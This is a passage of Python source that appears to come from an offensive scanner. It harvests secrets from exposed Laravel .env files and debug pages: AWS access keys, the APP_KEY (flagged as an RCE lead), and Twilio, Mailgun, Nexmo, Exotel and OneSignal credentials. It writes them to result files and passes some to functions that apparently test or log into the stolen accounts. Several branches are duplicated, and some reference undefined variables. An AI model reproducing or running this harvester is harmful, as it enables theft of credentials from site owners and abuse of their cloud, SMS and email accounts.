						aws_key = ''
					try:
						aws_sec = reg("<td>WAS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			else:
				if "AKIA" in str(text):
					save = open('Results/AKIA.txt','a')
					save.write(str(url)+'\n')
					save.close()
				return False
		except:
			return False
	def get_appkey(self, text, url):
		try:
			if "APP_KEY =" in text or "APP_KEY=":
				method =  '/.env'
				try:
					appkey = reg('\nAPP_KEY=(.*?)\n', text)[0]
				except:
					try:
						appkey = appkey = reg('\nAPP_KEY = (.*?)\n', text)[0]
					except:
						appkey = False
			elif "<td>APP_KEY</td>" in text:
				method = 'debug'
				appkey = reg('<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			if appkey:
				build = str(url) + '|' + appkey
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}RCE {fc}[{yl}{appkey}{fc}]")
				save = open(o_keya, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_twillio2(self, text, url):
		try:
			if "TWILIO_ACCOUNT_SID" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''

				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "#TWILIO_ACCOUNT_SID" in text:
				if "#TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\n#TWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\n#TWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "#TWILIO_SID=" in text:
				if "#TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\n#TWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\n#TWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO_SID" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "ACCOUNT_SID" in text:
				if "ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nAUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "#ACCOUNT_SID" in text:
				if "#ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\n#ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\n#AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>#ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "#TWILIO_SID" in text:
				if "#TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('#TWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('#TWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "SMS_API_SENDER_ID" in text:
				if "SMS_API_SENDER_ID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nSMS_API_SENDER_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nSMS_API_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nSMS_API_FROM=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>SMS_API_SENDER_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO_WRITE_SID" in text:
				if "TWILIO_WRITE_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SECURE_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_WRITE_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_WRITE_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_WRITE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_WRITE_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO_SECURE_ID" in text:
				if "TWILIO_SECURE_ID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SECURE_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_SECURE_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SECURE_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO_READ_SID" in text:
				if "TWILIO_READ_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_READ_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_READ_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_READ_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_READ_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_READ_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "twillio_message_id" in text:
				if "twillio_message_id=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\ntwillio_message_id=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\ntwillio_message_token=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>twillio_message_id</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>twillio_message_id<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>twillio_message_token<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TEL_SID" in text:
				if "TEL_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTEL_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTEL_TOK=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TEL_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TEL_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TEL_TOK<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TEL_SID" in text:
				if "TEL_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTEL_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTEL_TOK=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TEL_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TEL_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TEL_TOK<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "=AC" in text:
				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open(o_twiliom, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_mailgun(self, text, url):
		try:
			if "MAILGUN_DOMAIN" in text:
				if "MAILGUN_SECRET=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nMAILGUN_DOMAIN=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('\nMAILGUN_SECRET=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('\nMAILGUN_ENDPOINT=(.*?)\n', text)[0]
					except:
						sec = ''
				elif '<td>MAILGUN_DOMAIN</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('<td>MAILGUN_ENDPOINT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''

				build = str(acc_sid)+'|'+str(acc_key)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{acc_sid}{res}:{fc}{acc_key}{fc}]")
				save = open(o_mgapi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SMS_API_SENDER_ID" in text:
				if "SMS_API_SENDER_ID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nSMS_API_SENDER_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nSMS_API_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nSMS_API_FROM=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>SMS_API_SENDER_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_API_SENDER_ID: '+str(acc_sid)+'\nSMS_API_TOKEN: '+str(auhtoken)+'\nSMS_API_FROM: '+str(phone)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMS {fc}[{yl}{acc_sid}{res}:{fc}{authtoken}{fc}]")
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				save.close()
				legiontwilio2(acc_sid,authtoken)
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "TWILIO_SID" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(auhtoken)+'\nTWILIO_NUMBER: '+str(phone)
				remover = str(build).replace('\r', '')
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMS {fc}[{yl}{acc_sid}{res}:{fc}{authtoken}{fc}]")
				save.close()
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid,authtoken)
				return True
			elif "=AC" in text:
				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open(o_twiliom, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_manual(self, text, url):
		try:
			if "PLIVO" in text or "plivo" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_pliv, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "CLICKSEND" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_click, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MANDRILL" in text or "mandrill" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_drill, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MAILJET" in text or "mailjet" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_jet, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MAILGUN" in text or "mailgun" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_gun, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MESSAGEBIRD" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_bird, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SMS_" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_sms, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "VONAGE" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_von, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "NEXMO" in text or "nexmo" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_nex, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif 'characters">AKIA' in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_aws_man, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif 'characters">AC' in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_twi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "= AC" in text or "=AC" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_twi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "= AKIA" in text or "=AKIA" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_aws_man, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_nexmo2(self, text, url):
		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
				elif '<td>NEXMO_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "NEXMO_API_KEY" in text:
				if "NEXMO_API_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_API_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''

				elif '<td>NEXMO_API_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "NEXMO_API_KEY" in text:
				if "NEXMO_API_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('NEXMO_API_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('NEXMO_API_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''

				elif 'NEXMO_KEY' in text:
					method = 'debug'
					try:
						nexmo_key = reg('NEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('NEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "EXOTEL_API_KEY" in text:
				if "EXOTEL_API_KEY=" in text:
					method = '/.env'
					try:
						exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
					except:
						exotel_sid = ''
				elif '<td>EXOTEL_API_KEY</td>' in text:
					method = 'debug'
					try:
						exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_sid = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
				remover = str(build).replace('\r', '')
				save = open(o_exo, 'a')
				save.write(remover+'\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}EXOTEL {fc}[{yl}{exotel_api}{res}:{fc}{exotel_token}{fc}]")
				save.close()
				return True
			elif "ONESIGNAL_APP_ID" in text:
				if "ONESIGNAL_APP_ID=" in text:
					method = '/.env'
					try:
						onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
					except:
						onesignal_auth = ''
